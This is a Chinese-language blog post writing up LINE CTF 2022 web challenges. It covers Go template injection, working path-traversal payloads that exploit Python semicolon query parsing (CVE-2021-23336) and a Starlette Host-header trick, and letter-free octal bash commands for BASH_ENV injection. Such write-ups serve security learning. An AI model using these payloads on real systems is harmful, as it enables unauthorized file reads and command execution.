<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="zh-tw">
<head>
    <meta charset="utf-8">
<title>LINE CTF 2022 筆記 - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<link href="https://blog.huli.tw/2022/03/27/linectf-2022-writeup/" rel="alternate" hreflang="zh-TW" />


<link href="https://blog.huli.tw/2022/03/27/linectf-2022-writeup/" rel="alternate" hreflang="x-default" />


<link href="https://blog.huli.tw/2022/03/27/en/linectf-2022-writeup/" rel="alternate" hreflang="en" />
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/03/27/linectf-2022-writeup/">
    





    <meta name="description" content="跟著隊伍 Water Paddler 一起參加了 LINE CTF 2022，在隊友的 carry 之下拿了第七名，這次只有一題有幫上一點忙，其他都被隊友解掉或是卡死。這篇簡單記一下每一題的解法，大部分都參考自 LINE CTF 2022 Writeups by maple3142。">
<meta property="og:type" content="article">
<meta property="og:title" content="LINE CTF 2022 筆記">
<meta property="og:url" content="https://blog.huli.tw/2022/03/27/linectf-2022-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="跟著隊伍 Water Paddler 一起參加了 LINE CTF 2022，在隊友的 carry 之下拿了第七名，這次只有一題有幫上一點忙，其他都被隊友解掉或是卡死。這篇簡單記一下每一題的解法，大部分都參考自 LINE CTF 2022 Writeups by maple3142。">
<meta property="og:locale" content="zh_TW">
<meta property="article:published_time" content="2022-03-27T06:15:47.000Z">
<meta property="article:modified_time" content="2023-05-07T01:15:16.486Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">



<link rel="alternative" href="/atom.xml" title="LINE CTF 2022 筆記" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">文章列表</a>
            
            <a class="navbar-item "
               href="/categories">分類</a>
            
            <a class="navbar-item "
               href="/recommend">推薦閱讀</a>
            
            <a class="navbar-item "
               href="/about">關於我</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目錄">
                    目錄
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#gotm96-solves">1&nbsp;&nbsp;<b>gotm(96 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#memo-drive42-solves">2&nbsp;&nbsp;<b>Memo Drive(42 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#bb27-solves">3&nbsp;&nbsp;<b>bb(27 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#online-library19-solves">4&nbsp;&nbsp;<b>online library(19 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#haribote-secure-note7-solves">5&nbsp;&nbsp;<b>Haribote Secure Note(7 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#title-todo6-solves">6&nbsp;&nbsp;<b>title todo(6 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#me7-ball2-solves">7&nbsp;&nbsp;<b>me7-ball(2 solves)</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
                
                <i class="fab fa-medium"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
                
                <i class="fab fa-facebook"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
                <a class="navbar-item" href="/2022/03/27/en/linectf-2022-writeup/">English</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>。若是對更多 JavaScript 知識有興趣，歡迎參考我的新書<a target="_blank" rel="noopener" href="https://www.tenlong.com.tw/products/9786267757048">《JavaScript 重修就好》</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            LINE CTF 2022 筆記
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-03-27T06:15:47.000Z" itemprop="datePublished">2022年3月27日</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>跟著隊伍 <a target="_blank" rel="noopener" href="https://twitter.com/Water_Paddler">Water Paddler</a> 一起參加了 LINE CTF 2022，在隊友的 carry 之下拿了第七名，這次只有一題有幫上一點忙，其他都被隊友解掉或是卡死。這篇簡單記一下每一題的解法，大部分都參考自 <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups">LINE CTF 2022 Writeups by maple3142</a>。</p>
<span id="more"></span>

<h2><span id="gotm96-solves">gotm(96 solves)</span></h2><p>這題被隊友解掉所以沒仔細看，不過賽後看其他 writeup 是 go 的 SSTI，出現在這裡：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go">acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>
tpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">"Logged in as "</span> <span class="token operator">+</span> acc<span class="token punctuation">.</span>id<span class="token punctuation">)</span>
<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
tpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token operator">&amp;</span>acc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之前沒碰過 go 的 SSTI，稍微筆記一下，可以用 {<code>&#123;.&#125;&#125;</code> 把傳入的物件整個 dump 出來，順便附幾個參考連結：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1286">GO中SSTI研究</a></li>
<li><a target="_blank" rel="noopener" href="https://tyskill.github.io/posts/gossti/">Go SSTI初探</a></li>
</ol>
<h2><span id="memo-drive42-solves">Memo Drive(42 solves)</span></h2><p>先附上關鍵程式碼：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    context <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        context<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request
        clientId <span class="token operator">=</span> getClientID<span class="token punctuation">(</span>request<span class="token punctuation">.</span>client<span class="token punctuation">.</span>host<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        
        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        contents <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        context<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> filename
        context<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> contents<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這題的 flag 在 <code>./memo/flag</code> 底下，所以只要想辦法讓上面那一段的 path 可以讀到 flag 就勝利了。</p>
<p>隊友最後用這個 payload：<code>/view?id=flag;%2f%2e%2e/;</code>，因為對 python 太不熟，所以起個簡單的 server 來觀察一下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
<span class="token keyword">import</span> uvicorn
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>applications <span class="token keyword">import</span> Starlette
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>routing <span class="token keyword">import</span> Route
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>responses <span class="token keyword">import</span> JSONResponse

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        clientId <span class="token operator">=</span> <span class="token string">"id"</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.url:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.url.query"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"params:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"unquote params:"</span><span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"filename:"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"keys:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"path:"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>
    
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> JSONResponse<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

routes <span class="token operator">=</span> <span class="token punctuation">[</span>
    Route<span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> endpoint<span class="token operator">=</span>view<span class="token punctuation">)</span>
<span class="token punctuation">]</span>

app <span class="token operator">=</span> Starlette<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> routes<span class="token operator">=</span>routes<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    uvicorn<span class="token punctuation">.</span>run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">11000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先來看一下隊友的 payload 會怎樣：<code>/view?id=flag;%2f%2e%2e/;</code></p>
<pre class="line-numbers language-none"><code class="language-none">request.url: http:&#x2F;&#x2F;0.0.0.0:11000&#x2F;view?id&#x3D;flag;%2f%2e%2e&#x2F;;
request.url.query id&#x3D;flag;%2f%2e%2e&#x2F;;
params: id&#x3D;flag&amp;%2F..%2F&#x3D;
unquote params: flag
filename: flag
keys: dict_keys([&#39;id&#39;, &#39;&#x2F;..&#x2F;&#39;])
path: .&#x2F;memo&#x2F;id&#x2F;..&#x2F;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>request.url</code> 會直接是 raw URL，沒有 decode 過，然後 <code>request.url.query</code> 也是沒 decode 過的版本，到了 <code>request.query_params</code> 的時候則是被解析成了兩個 params:</p>
<ol>
<li>id&#x3D;flag</li>
<li>%2F..%2f&#x3D;</li>
</ol>
<p>看起來是因為分號 <code>;</code> 的關係，所以就算不用 <code>&amp;</code> 也可以創造出兩個 params。</p>
<p>而最後在 <code>request.query_params.keys()</code> 的時候被 decode，所以最後合起來就會是 <code>./memo/id..//flag</code>。</p>
<p>不過在 Discord 上看到其實這樣就好了：<code>id=flag;/%2e%2e</code>，結果會是：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">request<span class="token punctuation">.</span>url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">:</span><span class="token number">11000</span><span class="token operator">/</span>view?<span class="token builtin">id</span><span class="token operator">=</span>flag<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e
request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token builtin">id</span><span class="token operator">=</span>flag<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e
params<span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token operator">=</span>flag<span class="token operator">&amp;</span><span class="token operator">%</span>2F<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">=</span>
unquote params<span class="token punctuation">:</span> flag
filename<span class="token punctuation">:</span> flag
keys<span class="token punctuation">:</span> dict_keys<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'/..'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
path<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token operator">/</span>memo<span class="token operator">/</span><span class="token builtin">id</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接著也在 Discord 看到另一個不同的解法（來自 bbangjo#3967），是利用 Host header：</p>
<pre class="line-numbers language-none"><code class="language-none">GET http:&#x2F;&#x2F;0.0.0.0:11000&#x2F;view?id&#x3D;flag&amp;&#x2F;..
Host: 0.0.0.0#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>就會產生神奇的結果：</p>
<pre class="line-numbers language-none"><code class="language-none">request.url: http:&#x2F;&#x2F;0.0.0.0#&#x2F;view?id&#x3D;flag&amp;&#x2F;..
request.url.query
params: id&#x3D;flag&amp;%2F..&#x3D;
unquote params: flag
filename: flag
keys: dict_keys([&#39;id&#39;, &#39;&#x2F;..&#39;])
path: .&#x2F;memo&#x2F;id&#x2F;..&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>雖然 <code>request.url.query</code> 整個變不見了，但是 <code>request.query_params</code> 卻還是有東西，因此就繞過了針對 <code>request.url.query</code> 的檢查。</p>
<p>根據他的說法，因為 <code>request.url</code> 是從 Host header 構造而來的，我們可以翻一下程式碼來驗證，如果沒找錯的話應該是在這：<a target="_blank" rel="noopener" href="https://github.com/encode/starlette/blob/b1ae0c3621034f1531b9983389ce90be8d140bc6/starlette/datastructures.py#L38">starlette&#x2F;datastructures.py#L38</a>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> host_header <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
  url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>scheme<span class="token punctuation">&#125;</span></span><span class="token string">://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host_header<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>因為 Host 被加了個 <code>#</code>，所以後面的 query string 就被當成 fragment 來解析了，而不是 query string，所以 <code>request.url.query</code> 就會是空的。</p>
<p>那為什麼 <code>request.query_params</code> 有東西呢？因為它是直接拿最原始的 query string，而不是 <code>request.url.query</code>，在這邊：<a target="_blank" rel="noopener" href="https://github.com/encode/starlette/blob/6182d0a0bc7e5817197d2919b18d67f70e3a71d1/starlette/requests.py#L116">starlette&#x2F;requests.py#L116</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@property</span>
<span class="token keyword">def</span> <span class="token function">query_params</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> QueryParams<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_query_params"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>_query_params <span class="token operator">=</span> QueryParams<span class="token punctuation">(</span>self<span class="token punctuation">.</span>scope<span class="token punctuation">[</span><span class="token string">"query_string"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> self<span class="token punctuation">.</span>_query_params<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這真的是要看 source code 才會發現這種差異。</p>
<p>2022-03-29 補充：</p>
<p>感謝 @Zedd 提醒，把 <code>;</code> 當作 <code>&amp;</code> 來看的行為跟 Python 版本有關，因為會引起 cache poisoning 的關係，在較新的版本中都已經修復了，而挑戰時使用的版本是 3.9.0，所以才有這問題，而我在本機重現時用的也是還沒修復的版本。</p>
<p>漏洞編號為 CVE-2021-23336，詳情可看這裡：<a target="_blank" rel="noopener" href="https://python-security.readthedocs.io/vuln/urllib-query-string-semicolon-separator.html">urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator</a>。</p>
<h2><span id="bb27-solves">bb(27 solves)</span></h2><p>程式碼很短：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">bye</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ptn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$ptn</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/[a-zA-Z]/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">&#125;</span></span>=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$v</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'imdude'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>基本上就是要做到控制環境變數之後 RCE，這讓人自然而然會想到前陣子 P 牛發表的這篇：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令</a>，裡面提到可以藉由控制 <code>BASH_ENV </code> 來執行命令。</p>
<p>不過比較麻煩的地方是 a-zA-Z 都不能用，所以要在不能用英文字母的狀況下寫出指令來讀 flag 並回傳到自己 server。</p>
<p>聊天室有人給了一個類似題目的連結可以參考：<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/8468">34C3 CTF &#x2F; Tasks &#x2F; minbashmaxfun &#x2F; Writeup</a>，看了開頭給的 writeup 也才發現原來可以這樣用：</p>
<pre class="line-numbers language-none"><code class="language-none"># 等同於 $&#39;id&#39;
$&#39;\151\144&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>靠這樣就可以繞開限制，不用到字母，bash 真是博大精深。</p>
